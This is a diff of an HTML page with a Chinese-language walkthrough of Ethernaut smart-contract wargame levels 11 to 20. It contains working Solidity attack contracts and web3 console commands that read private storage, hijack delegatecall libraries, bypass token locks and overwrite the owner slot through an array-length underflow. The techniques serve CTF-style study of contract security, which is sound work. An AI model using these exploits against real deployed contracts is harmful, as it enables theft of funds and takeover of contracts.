@@ -7740,7 +7740,7 @@
 
 <h2 id="ethernaut-11-20">Ethernaut 11-20</h2>
 <h2 id="elevator">Elevator</h2>
-<p>目标：成为 top，让变量 top 变为 true
+<p>目标：成为 top，让变量 top 变为 true<br />
 代码：</p>
 <pre><code class="language-javascript">pragma solidity ^0.4.18;
 interface Building {
@@ -7758,7 +7758,7 @@ contract Elevator {
   }
 }
 </code></pre>
-<p>题目声明了 Building 接口中的那个 isLastFloor 函数，我们可以自己编写
+<p>题目声明了 Building 接口中的那个 isLastFloor 函数，我们可以自己编写<br />
 只要让他反转两次就可以啦</p>
 <p>exp：</p>
 <pre><code class="language-javascript">pragma solidity ^0.4.18;
@@ -7791,13 +7791,13 @@ contract BuildingEXP{
     }
 }
 </code></pre>
-<p>部署 hack 合约，然后执行 exploit 函数，就可以了，可以用 flag 查看一下
+<p>部署 hack 合约，然后执行 exploit 函数，就可以了，可以用 flag 查看一下<br />
 也可以在控制台查看 await contract.top()</p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589702583547-96fdbc00-cbd6-4fdf-8b59-8d2cf38c1dd3-223809.png" /></p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589702615062-91a7ed77-e2f5-4cbc-acfe-352ef19c3676-658366.png" /></p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1588821462735-75b03782-6dea-4871-ad6f-ce1f695e0665-828565.png" /></p>
 <h2 id="privacy">Privacy</h2>
-<p>目标：解锁需要一个 key，而这个 key 是 data[2] 是 private 的
+<p>目标：解锁需要一个 key，而这个 key 是 data[2] 是 private 的<br />
 在区块链上面没有私密的东西，都是公开的，只要找到就能过关</p>
 <pre><code class="language-javascript">pragma solidity ^0.4.18;
 contract Privacy {
@@ -7825,17 +7825,17 @@ contract Privacy {
   */
 }
 </code></pre>
-<p>evm 每次处理32个字节，不足 32 字节的变量相互共享并补齐 32 字节
+<p>evm 每次处理32个字节，不足 32 字节的变量相互共享并补齐 32 字节<br />
 那么我们简单分析下题目中的变量：</p>
 <blockquote>
-<p>bool public locked = true;  //1 字节 01
-uint256 public constant ID = block.timestamp; //32 字节 常量 不写入存储
-uint8 private flattening = 10; //1 字节 0a
-uint8 private denomination = 255;//1 字节 ff
-uint16 private awkwardness = uint16(now);//2 字节
+<p>bool public locked = true;  //1 字节 01<br />
+uint256 public constant ID = block.timestamp; //32 字节 常量 不写入存储<br />
+uint8 private flattening = 10; //1 字节 0a<br />
+uint8 private denomination = 255;//1 字节 ff<br />
+uint16 private awkwardness = uint16(now);//2 字节<br />
 bytes32[3] private data;</p>
 </blockquote>
-<p>第一个32 字节就是由locked、flattening、denomination、awkwardness组成，另外由于常量 constant 是无需存储的，所以从第二个32 字节开始就是 data。前几个合起来是第一个 32，data[0] 是第二个 32，data[1] 是第三个 32，所以我们的是第四个
+<p>第一个32 字节就是由locked、flattening、denomination、awkwardness组成，另外由于常量 constant 是无需存储的，所以从第二个32 字节开始就是 data。前几个合起来是第一个 32，data[0] 是第二个 32，data[1] 是第三个 32，所以我们的是第四个<br />
 <code>web3.eth.getStorageAt(instance,3,function(x,y){console.info(y);})</code></p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1588822677581-bf5bcdab-024e-4c98-ae36-7a227f53aa72-653736.png" /></p>
 <p>这个脸，好诡异</p>
@@ -7867,7 +7867,7 @@ contract GatekeeperOne {
   }
 }
 </code></pre>
-<p>调试看看
+<p>调试看看<br />
 首先部署一个原来的</p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1588836843530-c2c2ec8f-b4c1-480f-9afc-28540c6507a1-862107.png" /></p>
 <p>然后复制部署的合约地址，部署我们测试的攻击合约（我们要先部署一个可以打通的来绕过第一个关卡，方便调试看看第二个怎么弄）</p>
@@ -7970,9 +7970,9 @@ contract GatekeeperTwo {
   }
 }
 </code></pre>
-<p><strong>gate1</strong>：还是要建一个合约用来间接调用
-<strong>gate2</strong>：extcodesize 是用来获取指定地址合约代码大小的，这里用内联汇编的方式来获取调用方 caller 的代码大小。一般来说，当 caller 为合约时，获取的大小为合约字节码大小，caller 为账户时，获取的大小为 0，但是这样就不能满足第一个了。合约在初始化时代码大小为 0。所以我们可以把攻击合约的调用操作写在构造函数中
-<strong>gate3</strong>：传入一个八字节的 key，把 msg.sender 的 hash 计算出来与 uint64 类型的 key 异或，要等与 0-1，也就是 0xFFFFFFFFFFFFFFFF，只要我们先用 uint64(keccak256(msg.sender)) 与 0xFFFFFFFFFFFFFFFF 进行异或，这样再次异或的时候就成了 0xFFFFFFFFFFFFFFFF，也就符合条件了
+<p><strong>gate1</strong>：还是要建一个合约用来间接调用<br />
+<strong>gate2</strong>：extcodesize 是用来获取指定地址合约代码大小的，这里用内联汇编的方式来获取调用方 caller 的代码大小。一般来说，当 caller 为合约时，获取的大小为合约字节码大小，caller 为账户时，获取的大小为 0，但是这样就不能满足第一个了。合约在初始化时代码大小为 0。所以我们可以把攻击合约的调用操作写在构造函数中<br />
+<strong>gate3</strong>：传入一个八字节的 key，把 msg.sender 的 hash 计算出来与 uint64 类型的 key 异或，要等与 0-1，也就是 0xFFFFFFFFFFFFFFFF，只要我们先用 uint64(keccak256(msg.sender)) 与 0xFFFFFFFFFFFFFFFF 进行异或，这样再次异或的时候就成了 0xFFFFFFFFFFFFFFFF，也就符合条件了<br />
 （优先级为 – 大于 ^ 大于 ==）</p>
 <p>exp：</p>
 <pre><code class="language-javascript">pragma solidity ^0.4.18;
@@ -8038,7 +8038,7 @@ import 'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol';
   } 
 } 
 </code></pre>
-<p>先看一下有多少代币
+<p>先看一下有多少代币<br />
 await contract.balanceOf(player)</p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1588856590352-0f980209-6d3f-406d-87c0-8f8cc0946d51-942768.png" /></p>
 <p>在合约中，他 import 了一个 <a href="https://github.com/aragon/zeppelin-solidity/blob/master/contracts/token/StandardToken.sol">StandardToken.sol</a></p>
@@ -8094,9 +8094,9 @@ function transferFrom(TokenStorage storage self, address _from, address _to, uin
   }
 ...
 </code></pre>
-<p>使用 approve 进行授权
+<p>使用 approve 进行授权<br />
 await contract.approve(player,toWei(1000000))</p>
-<p>然后通过 transferFrom 来实施转账
+<p>然后通过 transferFrom 来实施转账<br />
 await contract.transferFrom(player,contract.address,toWei(1000000))</p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1588856635596-a6cf6365-2520-4f8b-9c3b-c998e98852e2-783277.png" /></p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1588856671528-979c0cae-f327-4b90-af81-04f2833ddf32-836702.png" /></p>
@@ -8143,9 +8143,9 @@ contract PreservationPoc {
   }
 }
 </code></pre>
-<p>首先调用正常合约中的一个函数 setxxxTime("恶意合约地址")，这样就可以把他的变量改成了我们的合约地址，再次去调用的时候就是去执行我们合约中的代码了，比如：
-await contract.setSecondTime("恶意合约的地址")
-这样 timeZone2Library 就成了恶意合约的地址，再次去执行 setSecondTime 的时候就是执行的恶意合约了，拿我们部署的来说就是改变了合约的所有者
+<p>首先调用正常合约中的一个函数 setxxxTime("恶意合约地址")，这样就可以把他的变量改成了我们的合约地址，再次去调用的时候就是去执行我们合约中的代码了，比如：<br />
+await contract.setSecondTime("恶意合约的地址")<br />
+这样 timeZone2Library 就成了恶意合约的地址，再次去执行 setSecondTime 的时候就是执行的恶意合约了，拿我们部署的来说就是改变了合约的所有者<br />
 await contract.setFirstTime(player)</p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589761154008-f3242d3d-ac26-476b-b144-7990c95f001e-650752.png" /></p>
 <p>一开始合约所有者不是我们，后面我们已经成为了合约的所有者，在第一次做的时候这样是不行的，要先用 setSecondTime 设置恶意合约为变量，然后 setFirstTime 来改变合约所有者，不明白怎么回事</p>
@@ -8173,7 +8173,7 @@ contract Locked {
     }
 }
 </code></pre>
-<p><a href="https://xz.aliyun.com/t/7152">【先知】智能合约审计系列——3、变量覆盖&amp;不一致性检查</a>
+<p><a href="https://xz.aliyun.com/t/7152">【先知】智能合约审计系列——3、变量覆盖&amp;不一致性检查</a><br />
 这里涉及到一个变量覆盖的问题，我们知道在 solidity 中是有两种存储状态的，一个是 storage 一个是 memory，对于 struct 和 数组 来说，默认就是 storage ，对应上面我们的第 12 行 NameRecord newRecord 会被当成一个指针，newRecord.name 默认指向第一个存储块，也就是 unlocked，所以我们可以通过修改 newRecord.name 来修改 unlocked</p>
 <p>当输入 name="0x0000000000000000000000000000000000000000000000000000000000000001"(63 个 0)，地址任意地址时，会覆盖 unlocked 的值，使其变为 true</p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589114179269-78af7a7b-f10a-417a-b5a9-20ba58baa264-014694.png" /></p>
@@ -8213,7 +8213,7 @@ contract SimpleToken {
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589115365206-3785ee23-127b-4470-89e7-dbe158fad166-375979.png" /></p>
 <p>可以看到，我们的帐户给了他 1 ether，然后他又给了另一个地址 0.5 ether，这就是新创建的合约的地址，我们只需要调用新建的这个合约的 destory</p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589115426932-5318f3d4-7111-480e-8639-754db4cdb80b-445646.png" /></p>
-<p>mark一下：
+<p>mark一下：<br />
 新建合约：0xD2F46c7A6F69d56570BF25346f0Cc893a5925828</p>
 <p>exp：把新建的合约地址贴上去部署 RecoveryPoc </p>
 <pre><code class="language-javascript">pragma solidity ^0.4.23;
@@ -8261,8 +8261,8 @@ contract MagicNum {
   */
 }
 </code></pre>
-<p>原理：<a href="https://hitcxy.com/2019/ethernaut/">https://hitcxy.com/2019/ethernaut/</a>  太强了！
-在合约创建的时候，用户或合约将交易发送到以太坊网络，没有参数 to，表示这是个合约创建而不是一个交易
+<p>原理：<a href="https://hitcxy.com/2019/ethernaut/">https://hitcxy.com/2019/ethernaut/</a>  太强了！<br />
+在合约创建的时候，用户或合约将交易发送到以太坊网络，没有参数 to，表示这是个合约创建而不是一个交易<br />
 EVM 把 solidity 代码编译为 字节码，字节码直接转换成 opcodes 运行</p>
 <p>字节码包含两部分：initialization code 和 runtime code ，一开始合约创建的时候 EVM 只执行 initialization code，遇到第一个 stop 或者 return 的时候合约的构造函数就运行了，此时合约便有了地址</p>
 <p>想要做这道题要构造这两段代码 initialization code 和 runtime code，initialization code 是由 EVM 创建并且存储需要用的 runtime code 的，所以首先来看 runtime code，想要返回 42，需要用 return(p,s) 但是在返回值前先要把值存储到内存中 mstore(p, v)</p>
@@ -8277,7 +8277,7 @@ EVM 把 solidity 代码编译为 字节码，字节码直接转换成 opcodes �
 0xf3     ;RETURN
 </code></pre>
 <p>所以整个 runtime code 是 0x602a60805260206080f3</p>
-<p>再来看 initialization code，首先 initialization code 要把 runtime code 拷贝到内训，然后再返回给 EVM
+<p>再来看 initialization code，首先 initialization code 要把 runtime code 拷贝到内训，然后再返回给 EVM<br />
 将代码从一个地方复制到一个地方的方法是 codecopy(t, f, s)。t 是目标位置，f 是当前位置，s 是代码大小（单位：字节），之前我们的代码大小为 10 字节</p>
 <pre><code class="language-javascript">;copy bytecode to memory
 0x600a   ;PUSH1 0x0a      S(runtime code size)
@@ -8291,11 +8291,11 @@ EVM 把 solidity 代码编译为 字节码，字节码直接转换成 opcodes �
 0x6000   ;PUSH1 0x00      P
 0xf3     ;RETURN
 </code></pre>
-<p>initialization codes 总共占了 0x0c 字节，这表示 runtime codes 从索引 0x0c 开始，所以 ?? 的地方是 0x0c
-所以，initialization codes 最后的顺序是 600a600c600039600a6000f3
+<p>initialization codes 总共占了 0x0c 字节，这表示 runtime codes 从索引 0x0c 开始，所以 ?? 的地方是 0x0c<br />
+所以，initialization codes 最后的顺序是 600a600c600039600a6000f3<br />
 两个拼起来，得到字节码是：0x600a600c600039600a6000f3602a60805260206080f3</p>
-<p>var bytecode = "0x600a600c600039600a6000f3602a60805260206080f3";
-web3.eth.sendTransaction({from:player,data:bytecode},function(err,res){console.log(res)});
+<p>var bytecode = "0x600a600c600039600a6000f3602a60805260206080f3";<br />
+web3.eth.sendTransaction({from:player,data:bytecode},function(err,res){console.log(res)});<br />
 然后去刚才交易的详情去看一下</p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589767390887-fad58366-bc49-4be6-a958-dae0f573972f-891354.png" /></p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589767546947-9b2c5b00-b1a8-40e1-b175-49972d74052a-903809.png" /></p>
@@ -8327,7 +8327,7 @@ contract AlienCodex is Ownable {
   }//修改数组里的内容
 }
 </code></pre>
-<p>由于 EVM 存储优化的关系，在 slot [0] 中同时存储了 contact 和 owner，所以我们要做的就是将 owner 变量覆盖为自己账户地址
+<p>由于 EVM 存储优化的关系，在 slot [0] 中同时存储了 contact 和 owner，所以我们要做的就是将 owner 变量覆盖为自己账户地址<br />
 所有函数都有 contacted 限制，所以必须要先通过 make_contact 把 contact 改成 true</p>
 <p>make_contact() 函数只验证传入数组的长度。OPCODE 中数组长度是存储在某个 slot 上的，并且没有对数组长度和数组内的数据做校验。所以可以构造一个存储位上长度很大，但实际上并没有数据的数组，打包成 data 发送</p>
 <pre><code class="language-javascript">sig = web3.sha3(&quot;make_contact(bytes32[])&quot;).slice(0,10)
@@ -8341,16 +8341,16 @@ contract.sendTransaction({data: sig + data1 + data2});
 // 发送交易
 </code></pre>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589121078356-523c787d-dd63-4715-8719-966e6e71ca8d-211342.png" /></p>
-<p>之后通过调用 retract()，使得 codex 数组长度下溢。
+<p>之后通过调用 retract()，使得 codex 数组长度下溢。<br />
 web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(y)});</p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589121660662-24e00c4b-eb40-41b1-9ade-76868c910d03-456332.png" /></p>
-<p>await contract.retract()
+<p>await contract.retract()<br />
 web3.eth.getStorageAt(contract.address, 1, function(x, y) {alert(y)});</p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589121759956-815fdd4c-78fe-4768-9080-6a30589b6d9d-628494.png" /></p>
-<p>再来看一下 codex 的位置：
-我们要修改 slot 0 对应的 codex[?]
-codex[X] == SLOAD(keccak256(slot) + X)
-X 就是我们传入的那一个下标，是我们可控的，我们改成 2^256 - keccak256(slot) 这样实际上就是 2^256，总共有 2^256 个 slot，我们去找的就是 slot 2^256 也就是 slot 0
+<p>再来看一下 codex 的位置：<br />
+我们要修改 slot 0 对应的 codex[?]<br />
+codex[X] == SLOAD(keccak256(slot) + X)<br />
+X 就是我们传入的那一个下标，是我们可控的，我们改成 2^256 - keccak256(slot) 这样实际上就是 2^256，总共有 2^256 个 slot，我们去找的就是 slot 2^256 也就是 slot 0<br />
 codex 的 slot 是 1，所以我们用下面的方法去计算一下</p>
 <pre><code class="language-javascript">pragma solidity ^0.4.18;
 contract test {
@@ -8361,7 +8361,7 @@ function go() view returns(bytes32){
 </code></pre>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589933976110-e35eb7b7-d094-4862-af4c-bd1010556bd9-711458.png" /></p>
 <p>2**256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 = 35707666377435648211887908874984608119992236509074197713628505308453184860938</p>
-<p>所以我们把 codex 的下标改成这个之后实际修改的就是 slot 0 的地址
+<p>所以我们把 codex 的下标改成这个之后实际修改的就是 slot 0 的地址<br />
 contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x000000000000000000000001改成player的地址')</p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589122132463-1a3f8f46-4e30-49ce-aed9-6c6bcf20a1e1-323248.png" /></p>
 <p><img alt="image.png" src="../img/Ow9AXlNmKAFj5Qym/1589122235999-b5add0c3-128a-4b34-8a39-532574cdee28-697549.png" /></p>
